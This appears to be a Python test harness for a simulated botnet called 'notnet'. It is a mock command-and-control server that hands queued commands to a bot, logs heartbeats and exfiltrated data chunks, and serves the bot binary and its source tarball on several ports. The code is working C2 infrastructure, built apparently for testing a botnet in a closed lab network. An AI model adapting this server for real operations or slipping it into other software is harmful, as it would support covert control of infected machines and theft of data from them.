#!/usr/bin/env python3
"""Scriptable HTTP C2 + payload server for the notnet sim.

Role split (one container, three listeners):
  8080  - C2 API: heartbeats (POST /api/v1/bot), command responses (POST /api/v1/bot),
          uploads (POST /api/v1/bot), exfil chunks (POST /api/v1/bot/exfil),
          source bundle (GET /notnet-src.tar), payload (GET /bot/notnet)
  8443  - payload download port (PAYLOAD_DL_PORT): GET /bot/notnet -> real binary
  8082  - backup C2 endpoint (rotation tests): same API as 8080

Queue-driven: the driver drops JSON command files into /queue/; the server serves
the next queued command on the next heartbeat/response read, then deletes it.
Every request/response is appended to /evidence/http.log (structured lines).

Wire contract (verified against src/protocol.c):
  - heartbeat body: {"cmd":"status","version":..,"hostname":..,"uptime":N,
    "scan_count":N,"cred_count":N,"secret":"..","proxy_on":0|1,"proxy_port":N,
    "relay_on":0|1,"relay_port":N,"tag":".."}  POST <http_path>
  - command response must contain "secret":"<c2_secret>" or the bot rejects it.
  - command response JSON: {"cmd":"<name>","args":"<args>","secret":"<secret>"}
  - bot command response: {"cmd":"<name>","result":"..","hostname":".."}
  - exfil chunks POSTed to <http_path>/exfil
"""
import json
import os
import re
import sys
import time
import socket
import threading
from datetime import datetime, timezone

C2_SECRET = os.environ.get("SIM_C2_SECRET", "mocksecret")
QUEUE_DIR = os.environ.get("SIM_QUEUE_DIR", "/queue")
EVIDENCE = os.environ.get("SIM_EVIDENCE", "/evidence/http.log")
PAYLOAD_DIR = os.environ.get("SIM_PAYLOAD_DIR", "/payload")
HTTP_PATH = os.environ.get("SIM_HTTP_PATH", "/api/v1/bot")

lock = threading.Lock()
stats = {"heartbeats": 0, "responses": 0, "uploads": 0, "exfil_chunks": 0, "commands_served": 0, "payload_dls": 0}


def log(line):
    ts = datetime.now(timezone.utc).isoformat()
    with lock:
        with open(EVIDENCE, "a") as f:
            f.write(f"{ts} {line}\n")
        print(f"[{ts}] {line}", flush=True)


CHANNEL = "http"
# Only the sim's attacker bot (docker-compose.sim.yml fixed IP) may receive
# queued driver commands. Devices (infected in earlier scenarios) heartbeat
# to this mock too — without this gate they win the queue claim race and
# commands meant for the bot are lost (CI SOCKS5/pin flakes, 2026-08-12).
BOT_IP = "172.29.0.9"


def _for_me(fn):
    """True if a queued command file is meant for THIS C2 mock.

    Channel-tagged files (http-*/ws-*/irc-* prefixes) are only claimed by their
    channel's mock; untagged files are claimable by any mock (legacy). Without
    this, heartbeats from devices infected in earlier scenarios (S1/S2) can pop
    a command queued for the bot on another channel, and it is lost (the S7 IRC
    failure, 2026-08-12).
    """
    for ch in ("http-", "ws-", "irc-"):
        if fn.startswith(ch):
            return ch[:-1] == CHANNEL
    return True


def next_command():
    """Pop the oldest queued command file and return its JSON content, or None.

    Atomic claim via os.rename: two C2 servers (HTTP + WS) share the queue
    dir, and a plain read+unlink races — both can see the same file and one
    gets a stale/half payload. Rename-to-claimed is atomic, so exactly one
    server wins each file.
    """
    try:
        files = sorted(os.listdir(QUEUE_DIR))
    except FileNotFoundError:
        return None
    for fn in files:
        if not fn.endswith(".json"):
            continue
        if not _for_me(fn):
            continue
        src = os.path.join(QUEUE_DIR, fn)
        claimed = src + ".claimed"
        try:
            os.rename(src, claimed)  # atomic: only one server wins
        except OSError:
            continue  # another server claimed it first
        try:
            with open(claimed) as f:
                data = json.load(f)
            return data
        except (json.JSONDecodeError, OSError):
            continue
        finally:
            try:
                os.unlink(claimed)
            except OSError:
                pass
    return None


def command_response(heartbeat):
    """Build the C2 response for a heartbeat POST: queued command or ok."""
    q = next_command()
    if q is not None:
        with lock:
            stats["commands_served"] += 1
        cmd = q.get("cmd", "status")
        args = q.get("args", "")
        resp = {"cmd": cmd, "args": args, "secret": C2_SECRET}
        log(f"SERVE cmd={cmd} args={args!r}")
        return json.dumps(resp)
    return json.dumps({"status": "ok", "secret": C2_SECRET})


def handle_http(conn, addr, port_label):
    """Handle one HTTP/1.1 connection (possibly multiple keep-alive requests)."""
    conn.settimeout(30)
    buf = b""
    try:
        while True:
            chunk = conn.recv(8192)
            if not chunk:
                break
            buf += chunk
            while True:
                he = buf.find(b"\r\n\r\n")
                if he == -1:
                    break
                header_data = buf[:he]
                rest = buf[he + 4:]
                lines = header_data.decode("utf-8", errors="replace").split("\r\n")
                reqline = lines[0]
                if not reqline:
                    buf = rest
                    continue
                method, path, _ver = reqline.split(" ", 2)
                clen = 0
                for h in lines[1:]:
                    if h.lower().startswith("content-length:"):
                        clen = int(h.split(":", 1)[1].strip())
                        break
                if len(rest) < clen:
                    break  # need more body bytes
                body = rest[:clen]
                buf = rest[clen:]
                handle_request(method, path, body, addr, port_label, conn)
    except (socket.timeout, ConnectionResetError, BrokenPipeError):
        pass
    except Exception as e:
        log(f"ERROR {port_label} {addr}: {e}")
    finally:
        try:
            conn.close()
        except OSError:
            pass


def handle_request(method, path, body, addr, port_label, conn):
    ts = datetime.now(timezone.utc).isoformat()
    if method == "POST" and path.rstrip("/") == HTTP_PATH.rstrip("/"):
        text = body.decode("utf-8", errors="replace")
        try:
            j = json.loads(text)
        except json.JSONDecodeError:
            j = {}
        kind = "heartbeat" if j.get("cmd") == "status" else "response"
        with lock:
            stats["heartbeats" if kind == "heartbeat" else "responses"] += 1
        log(f"{port_label} {kind} from {addr[0]} body={text[:300]}")
        if kind == "heartbeat":
            if addr[0] == BOT_IP:
                payload = command_response(j)
            else:
                # device heartbeat — never serve driver commands to devices
                payload = json.dumps({"status": "ok", "secret": C2_SECRET})
        else:
            # command response from bot — acknowledge only
            payload = json.dumps({"status": "ok", "secret": C2_SECRET})
            log(f"{port_label} RESP from {addr[0]}: {text[:300]}")
        send_response(conn, payload)
    elif method == "POST" and path.endswith("/exfil"):
        text = body.decode("utf-8", errors="replace")
        with lock:
            stats["exfil_chunks"] += 1
        log(f"{port_label} EXFIL chunk from {addr[0]} len={len(body)} body={text[:200]}")
        send_response(conn, json.dumps({"status": "ok", "secret": C2_SECRET}))
    elif method == "GET" and path.rstrip("/") == "/bot/notnet":
        with lock:
            stats["payload_dls"] += 1
        serve_file(conn, os.path.join(PAYLOAD_DIR, "notnet"), "application/octet-stream")
        log(f"{port_label} PAYLOAD download from {addr[0]}")
    elif method == "GET" and path.rstrip("/") == "/notnet-src.tar":
        serve_file(conn, os.path.join(PAYLOAD_DIR, "notnet-src.tar"), "application/x-tar")
        log(f"{port_label} SRC-TAR download from {addr[0]}")
    elif method == "GET" and path.rstrip("/").startswith("/bot/"):
        # Generic payload route: /bot/<name> serves payload/<name> if present.
        # Used by the S7 payload-pinning test (notnet.pin / notnet.bad) and
        # the drop path (/bot/notnet). Unknown names fall through to the
        # JSON fallback below.
        fname = os.path.basename(path.rstrip("/"))
        full = os.path.join(PAYLOAD_DIR, fname)
        if os.path.isfile(full):
            serve_file(conn, full, "application/octet-stream")
            log(f"{port_label} PAYLOAD {fname} download from {addr[0]}")
        else:
            send_response(conn, json.dumps({"status": "ok", "secret": C2_SECRET}))
            log(f"{port_label} GET {path} from {addr[0]} (no payload {fname})")
    elif method == "GET":
        # fallback: any GET -> 200 with secret (covers http_get on custom paths)
        send_response(conn, json.dumps({"status": "ok", "secret": C2_SECRET}))
        log(f"{port_label} GET {path} from {addr[0]}")
    else:
        send_response(conn, json.dumps({"status": "ok", "secret": C2_SECRET}))
        log(f"{port_label} {method} {path} from {addr[0]}")


def send_response(conn, body):
    body_b = body.encode("utf-8")
    resp = (
        "HTTP/1.1 200 OK\r\n"
        "Server: SimC2/1.0\r\n"
        "Content-Type: application/json\r\n"
        f"Content-Length: {len(body_b)}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode("utf-8") + body_b
    conn.sendall(resp)


def serve_file(conn, path, ctype):
    try:
        with open(path, "rb") as f:
            data = f.read()
    except OSError:
        data = b""
    resp = (
        "HTTP/1.1 200 OK\r\n"
        "Server: SimC2/1.0\r\n"
        f"Content-Type: {ctype}\r\n"
        f"Content-Length: {len(data)}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode("utf-8") + data
    try:
        conn.sendall(resp)
    except OSError:
        pass


def serve(port, label):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(16)
    log(f"LISTEN {label} on 0.0.0.0:{port} secret={C2_SECRET}")
    while True:
        try:
            conn, addr = srv.accept()
            t = threading.Thread(target=handle_http, args=(conn, addr, label), daemon=True)
            t.start()
        except KeyboardInterrupt:
            break


def main():
    ports = []
    # 8080 = primary C2, 8443 = payload, 8082 = backup C2
    if os.environ.get("SIM_ROLE", "c2") == "backup":
        ports.append((8082, "C2B"))
    else:
        ports.append((8080, "C2"))
        ports.append((8443, "PAY"))
    threads = [threading.Thread(target=serve, args=(p, l), daemon=True) for p, l in ports]
    for t in threads:
        t.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
